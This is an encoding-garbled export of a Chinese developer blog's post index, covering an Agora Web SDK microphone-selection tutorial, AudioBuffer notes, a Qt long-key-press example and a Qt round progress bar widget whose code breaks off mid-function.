è·å–è¿”å›å€¼ã€‚ 123456789// è·å–å¯ç”¨çš„éº¦å…‹é£è®¾å¤‡åˆ—è¡¨ã€‚// è°ƒç”¨æ—¶ï¼Œå¦‚æœæµè§ˆå™¨è¿˜æ²¡æœ‰è·å¾—éº¦å…‹é£è®¿é—®æƒé™ï¼Œä¼šåœ¨ç•Œé¢ä¸Šæç¤ºä½ æ˜¯å¦å…è®¸æµè§ˆå™¨è®¿é—®éº¦å…‹é£ã€‚AgoraRTC.getMicrophones().then((deviceInfoArray) =&gt; &#123; /* è¿”å› MediaDeviceInfo æ•°ç»„å¯¹è±¡ä¹‹åçš„æ“ä½œ*/&#125;).catch((e) =&gt; &#123; console.log(&quot;Failed to get microphones!&quot;, e);&#125;); 2. è·å–æ‘„åƒå¤´è®¾å¤‡ä¿¡æ¯ åœ¨æ­¤æ•™ç¨‹ä¸­ï¼Œæˆ‘ä»¬åœ¨ HTML ä¸­åˆ›å»ºä¸€ä¸ªä¸‹æ‹‰èœå•æ¥ä¾›ç”¨æˆ·é€‰æ‹©ä½¿ç”¨çš„æ‘„åƒå¤´è®¾å¤‡ã€‚åœ¨ç”¨æˆ·ç•Œé¢ä¸Šä½¿ç”¨ label å±æ€§æ˜¾ç¤ºè®¾å¤‡ä¿¡æ¯ã€‚deviceId å±æ€§ç”¨äºä¿å­˜è®¾å¤‡ IDï¼Œç”¨äºåç»­çš„æ‘„åƒå¤´è®¿é—®ã€‚ labelï¼Œå³è®¾å¤‡æ ‡ç­¾ï¼Œè¿”å›ä¸€ä¸ª DOMStringï¼Œä»£è¡¨æè¿°å¯¹åº”è®¾å¤‡çš„æ ‡ç­¾ã€‚å¦‚æœæµè§ˆå™¨æ²¡æœ‰è·å–è®¾å¤‡æƒé™ï¼Œåˆ™è¿”å› &quot;&quot;ã€‚ deviceIdï¼Œå³è®¾å¤‡ IDï¼Œè¿”å›ä¸€ä¸ª DOMStringï¼Œä»£è¡¨å¯¹åº”è®¾å¤‡ã€‚è®¾å¤‡ ID å¯¹äºåº”ç”¨æ˜¯å”¯ä¸€çš„ï¼Œåªè¦æµè§ˆå™¨çš„ cookie æ²¡æœ‰è¢«æ¸…é™¤ï¼Œå³ä½¿ä½ å¼€å¯äº†æ–°çš„æµè§ˆå™¨ä¼šè¯ï¼ˆsessionï¼‰ï¼Œè®¾å¤‡ ID ä¹Ÿä¼šä¿æŒä¸å˜ã€‚å¦‚æœä½ æ¸…é™¤äº†æµè§ˆå™¨ cookieï¼Œåˆ™è®¾å¤‡ ID ä¼šé‡ç½®ã€‚åŒç†ï¼Œå¦‚æœä½ å¼€å¯äº†æµè§ˆå™¨éšç§æ¨¡å¼ï¼Œå¯¹äºåŒä¸€ä¸ªè®¾å¤‡ï¼Œæ¯ä¸ªæµè§ˆå™¨ä¼šè¯çš„è®¾å¤‡ ID éƒ½æ˜¯ä¸åŒçš„ã€‚å› æ­¤ï¼Œå»ºè®®æ¯æ¬¡å¯¹è®¾å¤‡è¿›è¡Œæ“ä½œæ—¶é‡æ–°è·å–è®¾å¤‡ IDã€‚ HTML 123456789&lt;h1&gt;é€šè¿‡éº¦å…‹é£é‡‡é›†å¹¶åœ¨æœ¬åœ°æ¸²æŸ“éŸ³é¢‘&lt;/h1&gt;&lt;form&gt;&lt;b&gt; é€‰æ‹©ä½ è¦ä½¿ç”¨çš„éº¦å…‹é£ &lt;/b&gt;&lt;select id = &quot;microphoneList&quot; onchange = &quot;getDeviceId()&quot; &gt;&lt;option&gt; ---é€‰æ‹©éº¦å…‹é£--- &lt;/option&gt;&lt;/select&gt;&lt;/form&gt;&lt;p&gt;ä½ é€‰æ‹©è®¾å¤‡çš„ deviceId æ˜¯ï¼š&lt;/p&gt;&lt;p id=&quot;deviceId&quot;&gt;&lt;/p&gt; JavaScript 1234567891011121314151617181920212223// å®šä¹‰è®¾å¤‡ ID ä¸æ ‡ç­¾çš„æ˜ å°„let dict = &#123;&#125;;// è·å–æ‘„åƒå¤´åˆ—è¡¨AgoraRTC.getMicrophones().then((deviceInfoArray) =&gt; &#123; for (let deviceInfo of deviceInfoArray) &#123; let option = document.createElement(&quot;option&quot;); document.getElementById(&quot;microphoneList&quot;).appendChild(option); option.innerHTML = deviceInfo.label; dict[deviceInfo.label] = deviceInfo.deviceId; &#125;&#125;).catch((e) =&gt; &#123; console.log(&quot;Failed to get microphones!&quot;, e);&#125;);// æ ¹æ®ä¸‹æ‹‰èœå•é€‰æ‹©çš„è®¾å¤‡æ ‡ç­¾ï¼Œæ˜¾ç¤ºç›¸åº”çš„è®¾å¤‡ IDfunction getDeviceId() &#123; let microphoneList = document.getElementById(&quot;microphoneList&quot;); let deviceLabel = microphoneList.options[microphoneList.selectedIndex].text; document.getElementById(&quot;deviceId&quot;).innerHTML = dict[deviceLabel];&#125; 3. åˆ›å»ºéº¦å…‹é£éŸ³é¢‘è½¨é“å¹¶æ¸²æŸ“ è°ƒç”¨ createMicrophoneAudioTrack åˆ›å»ºéº¦å…‹é£éŸ³é¢‘è½¨é“å¹¶è°ƒç”¨æˆå‘˜æ–¹æ³• play é€šè¿‡ç³»ç»Ÿé»˜è®¤æ‰¬å£°å™¨å¯¹è§†é¢‘è¿›è¡Œæ¸²æŸ“ã€‚è¿™é‡Œè½¨é“çš„æ¦‚å¿µå’Œ WebRTC ä¸­çš„ track ç›¸ä¼¼ã€‚ä¸€ä¸ªè½¨é“ä»£è¡¨ä¸€è·¯ç‰¹å®šçš„è§†é¢‘æºæˆ–éŸ³é¢‘æºã€‚å£°ç½‘ SDK å°†ä¸åŒæ¥æºçš„éŸ³è§†é¢‘è½¨é“è¿›è¡ŒæŠ½è±¡ï¼Œå®šä¹‰äº†æ‘„åƒå¤´è§†é¢‘è½¨é“ã€å±å¹•é‡‡é›†è§†é¢‘è½¨é“åŠè‡ªå®šä¹‰æºè§†é¢‘è½¨é“ç­‰ã€‚ è¿™ä¸ªæ­¥éª¤åªæ˜¯ä¸ºäº†æ¼”ç¤ºéº¦å…‹é£éŸ³é¢‘è½¨é“çš„æ¸²æŸ“ã€‚å®é™…å¼€å‘é€šè¯åº”ç”¨æ—¶ï¼Œæœ¬åœ°ä¸éœ€è¦æ’­æ”¾æœ¬åœ°éº¦å…‹é£é‡‡é›†çš„éŸ³é¢‘ã€‚ HTML 123456789&lt;h1&gt;é€šè¿‡éº¦å…‹é£é‡‡é›†å¹¶åœ¨æœ¬åœ°æ¸²æŸ“éŸ³é¢‘&lt;/h1&gt;&lt;form&gt;&lt;b&gt; é€‰æ‹©ä½ è¦ä½¿ç”¨çš„éº¦å…‹é£ &lt;/b&gt;&lt;select id=&quot;microphoneList&quot; onchange=&quot;getDeviceId()&quot;&gt; &lt;option&gt; ---é€‰æ‹©éº¦å…‹é£--- &lt;/option&gt;&lt;/select&gt;&lt;/form&gt;&lt;p&gt;ä½ é€‰æ‹©è®¾å¤‡çš„ deviceId æ˜¯ï¼š&lt;/p&gt;&lt;p id=&quot;deviceId&quot;&gt;&lt;/p&gt; CSS 12body &#123;font-family: system-ui;background: #f06d06;color: white;text-align: center;&#125;div &#123;height: 200px;width: 50%;&#125; JavaScript 12345678910111213141516171819202122232425262728293031323334353637383940// å…¨å±€å˜é‡let dict = &#123;&#125;; // ä½¿ç”¨ dict æ˜ å°„è®¾å¤‡æ ‡ç­¾å’Œè®¾å¤‡ IDlet selectedDeviceId = &quot;&quot;; // ä¸‹é€‰æ¡†é€‰æ‹©çš„è®¾å¤‡å¯¹åº”çš„ IDlet microphoneAudioTrack = null; // éº¦å…‹é£éŸ³é¢‘è½¨é“å¯¹è±¡// è·å–æœ¬åœ°éº¦å…‹é£åˆ—è¡¨AgoraRTC.getMicrophones().then((deviceInfoArray) =&gt; &#123; for (let deviceInfo of deviceInfoArray) &#123; let option = document.createElement(&quot;option&quot;); document.getElementById(&quot;microphoneList&quot;).appendChild(option); option.innerHTML = deviceInfo.label; dict[deviceInfo.label] = deviceInfo.deviceId; &#125;&#125;).catch((e) =&gt; &#123; console.log(&quot;Failed to get microphones!&quot;, e);&#125;);// åˆ›å»ºéº¦å…‹é£éŸ³é¢‘è½¨é“AgoraRTC.createMicrophoneAudioTrack().then((microphoneAudioTrack) =&gt; &#123; // æ¸²æŸ“éŸ³é¢‘ã€‚SDK ä½¿ç”¨ç³»ç»Ÿé»˜è®¤çš„æ‰¬å£°å™¨æ’­æ”¾å£°éŸ³ã€‚ microphoneAudioTrack.play();&#125;).catch((e) =&gt; &#123; console.log(&quot;Failed to play audio!&quot;, e);&#125;);// æ ¹æ®é€‰æ‹©çš„è®¾å¤‡æ ‡ç­¾ï¼Œè¿”å›å¯¹åº”çš„è®¾å¤‡ ID å¹¶ä¼ ç»™éº¦å…‹é£éŸ³é¢‘è½¨é“function getDeviceId() &#123;let microphoneList = document.getElementById(&quot;microphoneList&quot;);let deviceLabel = microphoneList.options[microphoneList.selectedIndex].text;selectedDeviceId = dict[deviceLabel];document.getElementById(&quot;deviceId&quot;).innerHTML = selectedDeviceId;if (microphoneAudioTrack != null) &#123; microphoneAudioTrack.setDevice(selectedDeviceId);&#125;&#125; #éŸ³é¢‘å›è°ƒ setAudioFrameCallback setAudioFrameCallback(audioFrameCallback: null | function, frameSize?: undefined | number): void è®¾ç½®åŸå§‹éŸ³é¢‘æ•°æ®ï¼ˆPCMï¼‰å›è°ƒã€‚ è®¾ç½®æˆåŠŸåï¼ŒSDK ä¼šä¸æ–­åœ°å°†è¿œç«¯éŸ³é¢‘è½¨é“çš„éŸ³é¢‘å¸§ä»¥ AudioBuffer çš„å½¢å¼é€šè¿‡å›è°ƒè¿”å›ã€‚ ä½ å¯ä»¥é€šè¿‡ frameSize æ¥è®¾ç½®æ¯æ¬¡å›è°ƒä¸­éŸ³é¢‘å¸§çš„å¤§å°ã€‚è¯¥è®¾ç½®ä¹Ÿä¼šå½±å“å›è°ƒçš„é—´éš”ï¼ŒframeSize è¶Šå¤§ï¼Œæ¯æ¬¡å›è°ƒçš„éŸ³é¢‘æ•°æ®è¶Šå¤šï¼Œå›è°ƒé—´éš”è¶Šé•¿ã€‚ 1234567891011track.setAudioFrameCallback((buffer) =&gt; &#123; for (let channel = 0; channel &lt; buffer.numberOfChannels; channel += 1) &#123; // Float32Array with PCM data const currentChannelData = buffer.getChannelData(channel); console.log(&quot;PCM data in channel&quot;, channel, currentChannelData); &#125;&#125;, 2048);// ....// Stop getting the raw audio datatrack.setAudioFrameCallback(null); éŸ³é¢‘å›è°ƒè§£ç  AudioBuffer - Web API æ¥å£å‚è€ƒ | MDN AudioBuffer æ¥å£è¡¨ç¤ºå­˜åœ¨å†…å­˜é‡Œçš„ä¸€æ®µçŸ­å°çš„éŸ³é¢‘èµ„æºï¼Œåˆ©ç”¨AudioContext.decodeAudioData()æ–¹æ³•ä»ä¸€ä¸ªéŸ³é¢‘æ–‡ä»¶æ„å»ºï¼Œæˆ–è€…åˆ©ç”¨ AudioContext.createBuffer()ä»åŸå§‹æ•°æ®æ„å»ºã€‚æŠŠéŸ³é¢‘æ”¾å…¥ AudioBuffer åï¼Œå¯ä»¥ä¼ å…¥åˆ°ä¸€ä¸ª AudioBufferSourceNodeè¿›è¡Œæ’­æ”¾ã€‚ è¿™äº›ç±»å‹å¯¹è±¡è¢«è®¾è®¡æ¥æ§åˆ¶å°éŸ³é¢‘ç‰‡æ®µï¼Œå¾€å¾€çŸ­äº 45 ç§’ã€‚å¯¹äºæ›´é•¿çš„å£°éŸ³ï¼Œé€šè¿‡ MediaElementAudioSourceNodeæ¥å®ç°æ›´ä¸ºåˆé€‚ã€‚ç¼“å­˜åŒºï¼ˆbufferï¼‰åŒ…å«ä»¥ä¸‹æ•°æ®ï¼šä¸é—´æ–­çš„ IEEE754 32 ä½çº¿æ€§ PCMï¼Œä»-1 åˆ° 1 çš„èŒƒå›´é¢å®šï¼Œå°±æ˜¯è¯´ï¼Œ32 ä½çš„æµ®ç‚¹ç¼“å­˜åŒºçš„æ¯ä¸ªæ ·æœ¬åœ¨-1.0 åˆ° 1.0 ä¹‹é—´ã€‚å¦‚æœAudioBufferæœ‰ä¸åŒçš„é¢‘é“ï¼Œä»–ä»¬é€šå¸¸è¢«ä¿å­˜åœ¨ç‹¬ç«‹çš„ç¼“å­˜åŒºã€‚ 1) å±æ€§ AudioBuffer.sampleRate åªè¯» å­˜å‚¨åœ¨ç¼“å­˜åŒºçš„ PCM æ•°æ®çš„é‡‡æ ·ç‡ï¼šæµ®ç‚¹æ•°ï¼Œå•ä½ä¸º sample/sã€‚ AudioBuffer.length åªè¯» è¿”å›å­˜å‚¨åœ¨ç¼“å­˜åŒºçš„ PCM æ•°æ®çš„é‡‡æ ·å¸§æ•°ï¼šæ•´å½¢ã€‚ AudioBuffer.duration åªè¯» è¿”å›å­˜å‚¨åœ¨ç¼“å­˜åŒºçš„ PCM æ•°æ®çš„æ—¶é•¿ï¼šåŒç²¾åº¦å‹ï¼ˆå•ä½ä¸ºç§’ï¼‰ã€‚ AudioBuffer.numberOfChannels åªè¯» è¿”å›å­˜å‚¨åœ¨ç¼“å­˜åŒºçš„ PCM æ•°æ®çš„é€šé“æ•°ï¼šæ•´å½¢ã€‚ 2) æ–¹æ³• AudioBuffer.getChannelData() è¿”å›ä¸€ä¸ª Float32Arrayï¼ŒåŒ…å«äº†å¸¦æœ‰é¢‘é“çš„ PCM æ•°æ®ï¼Œç”±é¢‘é“å‚æ•°å®šä¹‰ï¼ˆæœ‰ 0 ä»£è¡¨ç¬¬ä¸€ä¸ªé¢‘é“ï¼‰ AudioBuffer.copyFromChannel() ä» AudioBuffer çš„æŒ‡å®šé¢‘é“å¤åˆ¶åˆ°æ•°ç»„ç»ˆç«¯ã€‚ AudioBuffer.copyToChannel() (en-US) å¤åˆ¶æ ·å“åˆ°åŸæ•°ç»„çš„ AudioBuffer çš„æŒ‡å®šé¢‘é“ 3) ä¾‹å­ ä»¥ä¸‹çš„ä¾‹å­å±•ç¤ºäº†å¦‚ä½•æ„å»ºä¸€ä¸ª AudioBuffer ä»¥åŠéšæœºç”¨ç™½å™ªéŸ³å¡«å……ã€‚ä½ å¯ä»¥åœ¨ audio-buffer demoåº“å‘ç°å®Œæ•´çš„æºä»£ç ï¼›ä¸€ä¸ªrunning live çš„ç‰ˆæœ¬ä¹Ÿå¯è·å¾—ã€‚ 123456789101112131415161718192021222324252627282930313233343536// Stereovar channels = 2;// Create an empty two second stereo buffer at the// sample rate of the AudioContextvar frameCount = audioCtx.sampleRate * 2.0;var myArrayBuffer = audioCtx.createBuffer(channels, frameCount, audioCtx.sampleRate);button.onclick = function() &#123; // Fill the buffer with white noise; // just random values between -1.0 and 1.0 for (var channel = 0; channel &lt; channels; channel++) &#123; // This gives us the actual array that contains the data var nowBuffering = myArrayBuffer.getChannelData(channel); for (var i = 0; i &lt; frameCount; i++) &#123; // Math.random() is in [0; 1.0] // audio needs to be in [-1.0; 1.0] nowBuffering[i] = Math.random() * 2 - 1; &#125; &#125; // Get an AudioBufferSourceNode. // This is the AudioNode to use when we want to play an AudioBuffer var source = audioCtx.createBufferSource(); // set the buffer in the AudioBufferSourceNode source.buffer = myArrayBuffer; // connect the AudioBufferSourceNode to the // destination so we can hear the sound source.connect(audioCtx.destination); // start the source playing source.start();&#125; 4) è§„æ ¼å‚æ•° Specification Web Audio API # AudioBuffer å½•éŸ³å¯¹è±¡å±æ€§ Agora Web API Reference - è¯­éŸ³é€šè¯ - æ–‡æ¡£ä¸­å¿ƒ - å£°ç½‘Agora éŸ³é¢‘ç¼–ç  AudioEncoderConfigurationPreset AudioEncoderConfigurationPreset: keyof typeof AUDIO_ENCODER_CONFIG_SETTINGS SDK é¢„è®¾çš„ [AudioEncoderConfiguration](https://docs.agora.io/cn/Voice/API Reference/web_ng/interfaces/audioencoderconfiguration.html) é…ç½®ã€‚ ä½ å¯ä»¥åœ¨ä»¥ä¸‹æ–¹æ³•ä¸­ä¼ å…¥é¢„è®¾å€¼æ¥æ§åˆ¶æœ¬åœ°éŸ³é¢‘çš„ç¼–ç é…ç½®ï¼š [AgoraRTC.createCustomAudioTrack](https://docs.agora.io/cn/Voice/API Reference/web_ng/interfaces/iagorartc.html#createcustomaudiotrack) [AgoraRTC.createMicrophoneAudioTrack](https://docs.agora.io/cn/Voice/API Reference/web_ng/interfaces/iagorartc.html#createmicrophoneaudiotrack) [AgoraRTC.createBufferSourceAudioTrack](https://docs.agora.io/cn/Voice/API Reference/web_ng/interfaces/iagorartc.html#createbuffersourceaudiotrack) ä¸‹è¡¨åˆ—å‡ºäº† SDK æ‰€æœ‰å†…ç½®çš„éŸ³é¢‘å±æ€§é…ç½®ï¼ŒSDK é»˜è®¤ä½¿ç”¨ &quot;music_standard&quot;ã€‚ éŸ³é¢‘å±æ€§ é…ç½® &quot;speech_low_quality&quot; 16 kHz é‡‡æ ·ç‡ï¼Œå•å£°é“ï¼Œç¼–ç ç ç‡çº¦ 24 Kbps &quot;speech_standard&quot; 32 kHz é‡‡æ ·ç‡ï¼Œå•å£°é“ï¼Œç¼–ç ç ç‡çº¦ 24 Kbps &quot;music_standard&quot; 48 kHz é‡‡æ ·ç‡ï¼Œå•å£°é“ï¼Œç¼–ç ç ç‡çº¦ 40 Kbps &quot;standard_stereo&quot; 48 kHz é‡‡æ ·ç‡ï¼ŒåŒå£°é“ï¼Œç¼–ç ç ç‡çº¦ 64 Kbps &quot;high_quality&quot; 48 kHz é‡‡æ ·ç‡ï¼Œå•å£°é“ï¼Œ ç¼–ç ç ç‡çº¦ 128 Kbps &quot;high_quality_stereo&quot; 48 kHz é‡‡æ ·ç‡ï¼ŒåŒå£°é“ï¼Œç¼–ç ç ç‡çº¦ 192 Kbps æœ¬åœ°éŸ³é¢‘è½¨é“ Agora Web API Reference - è¯­éŸ³é€šè¯ - æ–‡æ¡£ä¸­å¿ƒ - å£°ç½‘Agora å¯¹æ¥ åŸºäºå£°ç½‘ Web SDK å®ç°è§†é¢‘é€šè¯åœºæ™¯ - ä¸“æ  - å£°ç½‘ Agora RTC å¼€å‘è€…ç¤¾åŒº","tags":[{"name":"è„šæœ¬","slug":"è„šæœ¬","permalink":"https://hodlyounger.github.io/tags/%E8%84%9A%E6%9C%AC/"},{"name":"code/TypeScript","slug":"code-TypeScript","permalink":"https://hodlyounger.github.io/tags/code-TypeScript/"},{"name":"fastboard","slug":"fastboard","permalink":"https://hodlyounger.github.io/tags/fastboard/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"TypeScript","slug":"B-Code/TypeScript","permalink":"https://hodlyounger.github.io/categories/B-Code/TypeScript/"}]},{"title":"ã€Qtã€‘é”®ç›˜é•¿æŒ‰","date":"2023-10-27T01:24:02.337Z","path":"B_Code/Qt/é¼ æ ‡é”®ç›˜/ã€Qtã€‘é”®ç›˜é•¿æŒ‰/","text":"KeyPressEvent äº‹ä»¶ é”®ç›˜äº‹ä»¶æ˜¯é‡å†™ keypressevent å‡½æ•°ï¼Œè¯¦è§ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445//keyLongPress.cpp #include &quot;keyLongPress.h&quot;#include &quot;ui_keyLongPress.h&quot; KeyLongPress::KeyLongPress(QWidget *parent) : QWidget(parent), ui(new Ui::KeyLongPress)&#123; ui-&gt;setupUi(this);&#125; KeyLongPress::~KeyLongPress()&#123; delete ui;&#125; //QMouseEventæ²¡æœ‰isAutoRepeat()æ–¹æ³•...æ— è¯­äº†ï¼Œ//è¿™æ ·æœ‰äº›æ“ä½œå°±ä¸æ–¹ä¾¿å®ç°äº†ï¼Œ//æ¯”å¦‚é•¿æŒ‰é¼ æ ‡å¤šå°‘ç§’å‘¼å‡ºæŸä¸ª(ç™»å½•)çª—å£å•¥çš„ã€‚ //! [æŒ‰é”®æŒ‰ä¸‹äº‹ä»¶-Begin]void KeyLongPress::keyPressEvent(QKeyEvent *event)&#123; if(event-&gt;isAutoRepeat())&#123; qDebug() &lt;&lt; &quot;æŒ‰é”®é•¿æŒ‰ä¸­...&quot;; &#125; else&#123; qDebug() &lt;&lt; &quot;æŒ‰é”®æŒ‰ä¸‹&quot;; &#125;&#125;//! [æŒ‰é”®æŒ‰ä¸‹äº‹ä»¶-End] //! [æŒ‰é”®é‡Šæ”¾äº‹ä»¶-Begin]void KeyLongPress::keyReleaseEvent(QKeyEvent *event)&#123; if(event-&gt;isAutoRepeat())&#123; qDebug() &lt;&lt; &quot;æŒ‰é”®ä¸æ–­é‡Šæ”¾...&quot;; &#125; else&#123; qDebug() &lt;&lt; &quot;æŒ‰é”®é‡Šæ”¾&quot;; &#125;&#125;//! [æŒ‰é”®é‡Šæ”¾äº‹ä»¶-End] è¿è¡Œä¹‹åï¼Œæµ‹è¯•æ•ˆæœï¼š ä½ Clickçœ‹ä¸‹è¾“å‡ºï¼šæ˜¯åªæœ‰1æ¬¡Presså’Œ1æ¬¡Releaseçš„ï¼Œ é•¿æŒ‰çœ‹ä¸‹è¾“å‡ºï¼šæ˜¯Presså’ŒReleaseä¸€ç›´åœ¨ä¸åœçš„è¾“å‡ºçš„ã€‚ ç¤ºæ„å›¾ï¼š","tags":[{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"},{"name":"é”®ç›˜","slug":"é”®ç›˜","permalink":"https://hodlyounger.github.io/tags/%E9%94%AE%E7%9B%98/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"},{"name":"é¼ æ ‡é”®ç›˜","slug":"B-Code/Qt/é¼ æ ‡é”®ç›˜","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/%E9%BC%A0%E6%A0%87%E9%94%AE%E7%9B%98/"}]},{"title":"ã€Qtã€‘åœ†å½¢è¿›åº¦æ¡","date":"2023-10-27T01:24:02.327Z","path":"B_Code/Qt/åŠ¨ç”»/ã€Qtã€‘åœ†å½¢è¿›åº¦æ¡/","text":"[toc] å®ç°æ•ˆæœ h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#ifndef _QROUNDPROGRESSBAR_H_#define _QROUNDPROGRESSBAR_H_ #include &lt;QWidget&gt; class QRoundProgressBar : public QWidget&#123; Q_OBJECTpublic: //è¿›åº¦æ¡å½¢çŠ¶ enum BarStyle &#123; //åœ†ç¯çŠ¶ StyleDonut = 0, //åœ†é¥¼çŠ¶ StylePie, //åœ†çº¿çŠ¶ StyleLine &#125;; public: QRoundProgressBar(QWidget *parent , BarStyle style = StyleLine); ~QRoundProgressBar(); public: //è®¾ç½®æ‰«æå¼§åº¦èµ·å§‹è§’åº¦ void setStartAngle(double position); //è®¾ç½®è½®å»“ç”»ç¬”çš„å®½åº¦ void setOutlinePenWidth(double penWidth); //è®¾ç½®ç”»ç¬”å®½åº¦ void setDataPenWidth(double penWidth); //è®¾ç½®è¿›åº¦æ¡ç²¾åº¦ 88.88%,å‡ ä½å°æ•° void setDecimals(int count); //è®¾ç½®è¿›åº¦æ¡é£æ ¼ void setBarStyle(BarStyle style); //è®¾ç½®èŒƒå›´ void setRange(double min, double max); //è®¾ç½®å½“å‰å€¼ void setValue(int val); //è®¾ç½®å½“å‰å€¼ void setValue(double val); //è®¾ç½®æœ€å°å€¼ void setMinimum(double min); //è®¾ç½®æœ€å¤§å€¼ void setMaximum(double max); protected: void paintEvent(QPaintEvent *event); //ç”»åŸºç¡€å›¾å½¢ void drawBase(QPainter&amp; p, const QRectF&amp; baseRect, const QRectF &amp;innerRect); //æ ¹æ®å€¼ç”»å‡ºè¿›åº¦æ¡ void drawValue(QPainter&amp; p, const QRectF&amp; baseRect, double value, double arcLength, const QRectF &amp; innerRect , double innerDiameter); //ç”»ä¸­å¿ƒæ–‡å­— void drawText(QPainter&amp; p, const QRectF&amp; innerRect, double value); private: double m_min; //æœ€å°å€¼ double m_max; //æœ€å¤§å€¼ double m_value; //å½“å‰å€¼ BarStyle m_barStyle; //è¿›åº¦æ¡é£æ ¼ int m_decimals; //è¿›åº¦æ¡ç²¾åº¦ double m_startAngel; //æ‰«æå¼§åº¦èµ·å§‹è§’åº¦ double m_outlinePenWidth; //è½®å»“ç”»ç¬”çš„å®½åº¦ double m_dataPenWidth; //ç”»ç¬”å®½åº¦&#125;; #endif // _QROUNDPROGRESSBAR_H_ cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285#include &quot;QRoundProgressBar.h&quot;#include &lt;QPainter&gt;#include &lt;QPointF&gt;#include &lt;QtMath&gt; QRoundProgressBar::QRoundProgressBar(QWidget *parent , BarStyle style) : QWidget(parent) , m_min(0) , m_max(100) , m_value(0) , m_startAngel(90) , m_barStyle(style) , m_outlinePenWidth(0) , m_dataPenWidth(0) , m_decimals(0)&#123;&#125; QRoundProgressBar::~QRoundProgressBar()&#123;&#125; void QRoundProgressBar::setStartAngle(double angle)&#123; if (angle != m_startAngel) &#123; m_startAngel = angle; update(); &#125;&#125; void QRoundProgressBar::setOutlinePenWidth(double penWidth)&#123; if (penWidth != m_outlinePenWidth) &#123; m_outlinePenWidth = penWidth; update(); &#125;&#125; void QRoundProgressBar::setDataPenWidth(double penWidth)&#123; if (penWidth != m_dataPenWidth) &#123; m_dataPenWidth = penWidth; update(); &#125;&#125; void QRoundProgressBar::setDecimals(int count)&#123; if (count &gt;= 0 &amp;&amp; count != m_decimals) &#123; m_decimals = count; update(); &#125;&#125; void QRoundProgressBar::setBarStyle(BarStyle style)&#123; if (style != m_barStyle) &#123; m_barStyle = style; update(); &#125;&#125; void QRoundProgressBar::setRange(double min, double max)&#123; m_min = min; m_max = max; if (m_max &lt; m_min) &#123; qSwap(m_max, m_min); &#125; if (m_value &lt; m_min) &#123; m_value = m_min; &#125; else if (m_value &gt; m_max) &#123; m_value = m_max; &#125; update();&#125; void QRoundProgressBar::setValue(double val)&#123; if (m_value != val) &#123; if (val &lt; m_min) &#123; m_value = m_min; &#125; else if (val &gt; m_max) &#123; m_value = m_max; &#125; else &#123; m_value = val; &#125; update(); &#125;&#125; void QRoundProgressBar::setValue(int val)&#123; setValue(double(val));&#125; void QRoundProgressBar::setMinimum(double min)&#123; setRange(min, m_max);&#125; void QRoundProgressBar::setMaximum(double max)&#123; setRange(m_min, max);&#125; void QRoundProgressBar::paintEvent(QPaintEvent* /*event*/)&#123; //å¤–åœˆç›´å¾„ double outerDiameter = this-&gt;width(); //å¤–åœˆçŸ©å½¢ QRectF baseRect(0, 0, outerDiameter, outerDiameter); QPainter p(this); p.setRenderHints(QPainter::Antialiasing | QPainter::SmoothPixmapTransform); //ç”»èƒŒæ™¯çŸ©å½¢å¡«å……ç™½è‰² p.fillRect(baseRect, QBrush(QColor(&quot;#FFFFFF&quot;))); //å†…åœ†ç›´å¾„ double innerDiameter = width() * 0.9; //å†…åœˆçŸ©å½¢ QRectF innerRect; //è®¡ç®—å†…åœˆçŸ©å½¢ if (m_barStyle == StyleLine) &#123; innerDiameter = outerDiameter - m_outlinePenWidth; &#125; else if(m_barStyle == StyleDonut) &#123; innerDiameter = outerDiameter * 0.9; &#125; double delta = (outerDiameter - innerDiameter) / 2; innerRect = QRectF(delta, delta, innerDiameter, innerDiameter); //ç”»åŸºç¡€å›¾å½¢ drawBase(p, baseRect, innerRect); //è®¡ç®—å½“å‰æ­¥é•¿æ¯”ä¾‹ double arcStep = 360.0 / (m_max - m_min) * m_value; //æ ¹æ®å€¼ç”»å‡ºè¿›åº¦æ¡ drawValue(p, baseRect, m_value, arcStep, innerRect, innerDiameter); //ç”»æ–‡å­— drawText(p, baseRect, m_value); p.end();&#125; void QRoundProgressBar::drawBase(QPainter &amp;p, const QRectF &amp;baseRect, const QRectF &amp;innerRect)&#123; switch (m_barStyle) &#123; case StyleDonut: &#123; QPainterPath dataPath; dataPath.setFillRule(Qt::OddEvenFill); dataPath.moveTo(baseRect.center()); dataPath.addEllipse(innerRect); QPen pen; pen.setColor(QColor(&quot;#DEE3E7&quot;)); pen.setWidth(10); p.setPen(pen); p.setBrush(QBrush(QColor(&quot;#FFFFFF&quot;))); p.drawPath(dataPath); break; &#125; case StylePie: &#123; p.setPen(QPen(QColor(&quot;#FFFFFF&quot;), m_outlinePenWidth)); p.setBrush(QBrush(QColor(&quot;#DEE3E7&quot;))); p.drawEllipse(baseRect); break; &#125; case StyleLine: &#123; p.setPen(QPen(QColor(&quot;#FFFFFF&quot;), m_outlinePenWidth)); p.setBrush(Qt::NoBrush); p.drawEllipse(baseRect.adjusted(m_outlinePenWidth / 2, m_outlinePenWidth / 2, -m_outlinePenWidth / 2, -m_outlinePenWidth / 2)); break; &#125; default: &#123; break; &#125; &#125;&#125; void QRoundProgressBar::drawValue(QPainter &amp;p, const QRectF &amp;baseRect , double value, double arcLength , const QRectF &amp; innerRect, double innerDiameter)&#123; if (value == m_min) &#123; return; &#125; if (m_barStyle == StyleLine) &#123; p.setPen(QColor(&quot;#2F8DED&quot;)); p.setBrush(Qt::NoBrush); p.drawArc(baseRect,m_startAngel * 16, -arcLength * 16); &#125; else if (m_barStyle == StyleDonut) &#123; QPen pen; pen.setColor(QColor(&quot;#2F8DED&quot;)); 